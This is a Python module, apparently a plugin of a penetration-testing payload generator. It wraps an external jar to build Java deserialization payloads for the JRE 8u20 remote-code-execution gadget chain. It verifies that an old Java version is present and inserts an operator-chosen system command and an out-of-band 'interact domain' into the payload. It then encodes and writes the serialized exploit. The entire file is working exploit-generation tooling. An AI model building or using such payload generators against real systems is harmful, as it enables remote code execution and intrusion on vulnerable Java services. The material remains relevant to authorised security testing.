import re
import logging
import os
from .serializer import Serializer

class JRE8u20RCEGadget(Serializer):

    usage = 'java -jar ExploitGenerator.jar <command>'

    exploitFile = 'exploit.ser'

    def __init__(self, javaPath, jarPath, chainOpts):
        self.javaPath = javaPath
        self.jarPath = jarPath
        self.javaVersion = None
        javaOpts = ""
        bin = f"'{javaPath}' {javaOpts} -jar '{jarPath}'"
        super().__init__(bin, chainOpts)

    def exists(self):
        if not os.path.isfile(self.javaPath):
            logging.error(f"Java bin path not found: {self.javaPath}")
            return False
        result = super().exists('')
        if not result:
            return False
        logging.debug("Checking java binary version")
        binBackup = self.bin
        self.bin = self.javaPath
        versionOut = self.exec('-version 2>&1').split('\n')
        self.bin = binBackup
        pattern = r"version\s+\"(?P<majorVersion>[0-9]+)\.(?P<minorVersion>[0-9]+)\.(?P<patchVersion>[0-9]+)(_(?P<updateVersion>[0-9]+))?"
        regex = re.compile(pattern)
        majorVersion = None
        for line in versionOut:
            match = regex.search(line.lower())
            if match:
                majorVersion = int(match.groupdict()['majorVersion'])
                minorVersion = int(match.groupdict()['minorVersion'])
                patchVersion = int(match.groupdict()['patchVersion'])
                updateVersion = int(match.groupdict()['updateVersion'])
                # Exemple of formats depending on OpenJDK or Java flavor
                # openjdk version "17.0.12" 2024-07-16
                # java version "1.8.0_431"

                # openjdk
                if majorVersion > 1:
                    updateVersion = patchVersion
                    patchVersion = minorVersion
                    minorVersion = majorVersion
                    majorVersion = 1
                
                self.javaVersion = f"{majorVersion}.{minorVersion}.{patchVersion}_{updateVersion}"
                logging.info(f"Detected java version: {self.javaVersion}")
                logging.debug(f"Detailed version: {line}")
                break
        
        if self.javaVersion == None:
            logging.error("Cannot detect java version, Java 8u0 <= 8u20 required")
            return False

        if majorVersion != 1 or minorVersion != 8 or patchVersion != 0 or updateVersion > 20:
            logging.error(f"Java 8u0 <= 8u20 required, but found: {self.javaVersion}")
            return False
            
        return True

    def chains(self):
        chains = []

        chains.append({
            'id': "jre8u20-rce",
            'name': "jre8u20-rce",
            'description': "JRE 8 RCE Deserialization gadget",
            'output': "binary",
            'ref': 'https://github.com/pwntester/JRE8u20_RCE_Gadget'
        })    
            
        return chains

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain

        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")

        logging.info(f"Generating payloads...")
        
        # generate payload for each chain
        count = 0
        for chain in chains:

            if self.chainOpts.format != None and self.chainOpts.format != chain['output']:
                logging.debug(f"[{chain['name']}] Skipping chain of format '{chain['output']}'")
                continue

            logging.info(f"[{chain['name']}] Generating payload with gadget '{chain['description']}'")

            if os.path.isfile(self.exploitFile):
                logging.debug(f"Cleaning temporary exploit file {self.exploitFile}")
                os.remove(self.exploitFile)

            chain_system_command = system_command
            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
            escaped_chain_system_command = chain_system_command.replace("'", "\\'")

            chainArguments = f"'{escaped_chain_system_command}'"

            result = self.payload("", chainArguments)
                
            if result.returncode != 0 or result.stdout.strip() == b'':
                logging.error(f"[{chain['name']}] Failed to create payload")
                if result.stdout != b'':
                    logging.error(result.stdout.decode('ascii'))
                    pass
                logging.error(result.stderr.decode('ascii'))
                continue

            if not os.path.isfile(self.exploitFile):
                logging.error(f"Error: no result exploit file after execution: {self.exploitFile}")
                continue

            with open(self.exploitFile, 'rb') as f:
                payload = f.read()

            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            if os.path.isfile(self.exploitFile):
                logging.debug(f"Cleaning temporary exploit file {self.exploitFile}")
                os.remove(self.exploitFile)

            payload = self.encode(payload)

            self.output(chain['id'], payload+b"\n")
            count = count + 1
            
        return count
